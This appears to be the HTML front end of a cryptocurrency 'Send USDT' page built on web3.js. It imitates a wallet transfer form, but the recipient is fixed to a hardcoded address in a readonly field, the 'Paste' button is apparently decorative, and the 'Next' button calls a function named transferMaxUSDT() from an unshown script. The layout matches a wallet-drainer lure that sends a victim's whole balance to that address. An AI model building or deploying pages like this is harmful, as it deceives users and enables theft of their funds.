<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Send USDT</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="style.css" />
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
  </head>
  <body>
    <div class="container">
      <label>Address or Domain Name</label>
      <div class="input-group">
        <input type="text" value="0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999" readonly />
        <button class="paste-btn">Paste</button>
      </div>

      <label>Amount</label>
      <div class="input-group">
        <input type="text" id="usdtAmount" readonly />
        <span class="unit">USDT</span>
        <button class="max-btn" onclick="setMax()">Max</button>
      </div>

      <p id="usdValue">= $0.00</p>

      <button class="next-btn" onclick="transferMaxUSDT()">Next</button>
      <p id="status"></p>
    </div>

    <script src="script.js"></script>
  </body>
</html>
